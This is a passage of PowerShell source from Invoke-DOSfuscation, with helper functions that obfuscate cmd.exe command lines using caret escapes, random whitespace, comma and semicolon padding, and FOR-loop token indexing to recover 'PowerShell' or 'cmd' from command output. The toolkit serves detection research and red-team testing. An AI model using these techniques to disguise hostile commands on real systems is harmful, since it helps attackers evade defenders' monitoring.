    if ($RandomSpace.IsPresent)
    {
        # Add random whitespace values between each command index value.
        if ($commandIndexDelim -eq ',')
        {
            $commandIndexes = -join ($CommandIndexArray | foreach-object { [System.String] $_ + (' ' * (Get-Random -InputObject $RandomSpaceRange)) + $commandIndexDelim + (' ' * (Get-Random -InputObject $RandomSpaceRange)) } )
        }
        else
        {
            # Replace any 0's in $RandomSpaceRange with 1's to ensure at least one space between each index while maintaining the appropriate range and potential weighted values defined by the user in $RandomSpaceRange.
            $RandomSpaceRange = $RandomSpaceRange -Replace 0,1
            
            $commandIndexes = -join ($CommandIndexArray | foreach-object { [System.String] $_ + (' ' * (Get-Random -InputObject $RandomSpaceRange)) } )
        }

        # Add random whitespace values before and after the $commandIndexes string.
        $commandIndexes = (' ' * (Get-Random -InputObject $RandomSpaceRange)) + $commandIndexes.TrimEnd().TrimEnd($commandIndexDelim)
    }

    # Return obfuscated resultant index as a single string.
    return $commandIndexes
}


function Out-ObfuscatedCaret
{
<#
.SYNOPSIS

Out-ObfuscatedCaret obfuscates input string with caret escape characters.

Invoke-DOSfuscation Helper Function: Out-ObfuscatedCaret
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Out-ObfuscatedCaret obfuscates input string with caret escape characters.

.PARAMETER StringToObfuscate

Specifies string to obfuscate with caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $StringToObfuscate,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50
    )

    # Return $null if input is empty. Do not want to force validation of this in parameter to avoid excess IF block checks through calling functions.
    if (-not $StringToObfuscate)
    {
        return $null
    }

    # Define characters that have escapable meaning to cmd.exe so we do not insert carets in front of these characters.
    $charsToEscape = @('^','&','<','>','|','%','n','"','(',')')

    # Insert caret before non-escapable characters according to the frequency defined in $RandomCaretPercent.
    $obfuscatedResult = $StringToObfuscate
    $loopLimit = 3
    $loopCounter = 0
    do
    {
        # Keep track of previous character to make sure we don't accidentally escape an escape as we add caret characters.
        $lastChar = $null
        
        $obfuscatedResult = -join ([System.Char[]] $StringToObfuscate | foreach-object {
            # If character has escapable meaning then return without a caret.
            if (($charsToEscape -contains $_) -or ($lastChar -eq '^'))
            {
                $_
            }
            elseif ((Get-Random -InputObject @(1..100)) -le $RandomCaretPercent)
            {
                ('^' + $_)
            }
            else
            {
                $_
            }

            $lastChar = $_
        })

        # Increment $loopCounter to avoid infinite loop if only (or primarily) escapable characters are input.
        $loopCounter++
    }
    while (($loopCounter -le $loopLimit) -and ([System.Double] (($obfuscatedResult.Length - $StringToObfuscate.Length) / $StringToObfuscate.Length) -lt [System.Double] ([System.Double] ($RandomCaretPercent * 0.75) / 100)))

    # Return final result.
    return $obfuscatedResult
}


function Get-RandomWhitespaceAndRandomChar
{
<#
.SYNOPSIS

Get-RandomWhitespaceAndRandomChar returns a string of random whitespace and defined random characters (commas, semicolons and parentheses) if corresponding options are selected.

Invoke-DOSfuscation Helper Function: Get-RandomWhitespaceAndRandomChar
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Get-RandomWhitespaceAndRandomChar returns a string of random whitespace and defined random characters (commas, semicolons and parentheses) if corresponding options are selected.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input between and encapsulating the randomly-selected characters.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input as randomly-selected characters.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be inserted between randomly-selected characters if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the array of characters to select from per iteration as random delimiter characters.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),

        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';','(',')') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';')))
    )
    
    # If -RandomChar argument is selected then introduce random commas/semicolons into command, the quantity of which is randomly selected from the range input via the -RandomCharRange argument at a frequency defined by the -RandomCharPercent argument.
    # Also introduce random whitespace is -RandomSpace argument is selected.
    $randomWhitespaceAndChars = ''
    if ($RandomChar.IsPresent)
    {
    
        # Randomly select the upper limit for comma/semicolon quantity from $randomCharRange.
        $charRangeUpperLimit = [System.Int16] ((Get-Random -InputObject $randomCharRange) - 0.01)

        # Return the defined range of commas/semicolons.
        $RandomWhitespaceAndChars = @(1..$charRangeUpperLimit) | foreach-object {
            if ($RandomSpace.IsPresent)
            {
                ' ' * ([System.Int16] (((Get-Random -InputObject $RandomSpaceRange) / 2) + 0.01))
            }
            
            # Randomly select delimiter character (comma or semicolon) from $randomCharArray.
            if ($randomCharArray.Count -eq 1)
            {
                $RandomCharacter = $randomCharArray
            }
            else
            {
                $RandomCharacter = Get-Random -InputObject $randomCharArray -Count 1
            }
            $RandomCharacter
        }

        # Add random whitespace to the end if -RandomSpace argument is selected.
        if ($RandomSpace.IsPresent)
        {
            $RandomWhitespaceAndChars += (' ' * ([System.Int16] (((Get-Random -InputObject $RandomSpaceRange) / 2) + 0.01)))
        }
    }
    elseif ($RandomSpace.IsPresent)
    {
        # Add random whitespace if -RandomSpace argument is selected (and -RandomChar is not selected).
        $RandomWhitespaceAndChars = ' ' * ([System.Int16] ((Get-Random -InputObject $RandomSpaceRange) / 2))
    }
    
    # Return result as single string.
    return -join $randomWhitespaceAndChars
}


function Get-Index
{
<#
.SYNOPSIS

Get-Index returns an array of integers for all "tokens" values in cmd.exe's FOR /L loop that match the input search string against the input command output and delims values.

Invoke-DOSfuscation Helper Function: Get-Index
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Get-Index returns an array of integers for all "tokens" values in cmd.exe's FOR /L loop that match the input search string against the input command output and delims values.

.PARAMETER Delims

Specifies the character array of required + randomly-selected delimiters that will separate "PowerShell"/"cmd" from the command output for retrieval and immediate invocation usage.

.PARAMETER Output

Specifies the expected output of each randomly-selected command from which this function uses to determine the matching index value(s) given the input -Delims and -SearchTerm values.

.PARAMETER SearchTerm

Specifies the string "PowerShell"/"cmd" (case-sensitive) that this function is looking for in delimited -Output value.

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Char[]]
        $Delims,
        
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $Output,
        
        [Parameter(Position = 0, Mandatory = $true)]
        [System.String]
        $SearchTerm
    )

    # Store all matching token index values in this array before returning to calling function.
    $tokenValues = @()

    # Return all case-sensitive matching index/tokens values for current search term, delims and result value.
    if ($matchingStrings = $Output.Split(-join $Delims) | select-string -CaseSensitive "^$SearchTerm$")
    {
        # Delims in cmd.exe FOR loop exclude null split results and the index starts with 1 instead of 0, so in PowerShell implementation below we will remove null lines and handle shifted index.
        $splitOutput = $Output.Split(-join $Delims) | where-object { $_ }

        # Use $indexPadding only if multiple matches in single output are found so all possible index matches are returned.
        $indexPadding = 0

        # Retrieve all case-sensitive matching indexes in $splitOutput for all matches in $matchingStrings.
        foreach ($matchingString in $matchingStrings)
        {
            # Find index of next case-sensitive match for $matchingString in $splitOutput.
            # Below one-liner works in PS3.0, but [System.Object[]] does not contain an .IndexOf method in PS2.0, thus the verbose for loop instead for compatibility.
            # $curIndex = $splitOutput.IndexOf([System.String] $matchingString)
            for ($i = 0; $i -lt $splitOutput.Length - 1; $i++)
            {
                if ($splitOutput[$i] -ceq $matchingString)
                {
                    $curIndex = $i
                    
                    continue
                }
            }

            # Update index with $indexPadding taken into account and updated for shifting $splitOutput array.
            $index = $indexPadding + $curIndex
            $indexPadding += $curIndex

            # Add current index match to $tokenValues array.
            # Delims in cmd.exe FOR loop exclude null split results and the index starts with 1 instead of 0, thus the +1 shift below.
            $tokenValues += ($index + 1)

            # Shift remaining $splitOutput.
            if (($index -ne -1) -and ($index -le $splitOutput.Count))
            {
                $splitOutput = $splitOutput[$index..($splitOutput.Count - 1)]
            }
        }
    }

    # Return all matching token index values
    return $tokenValues   
}
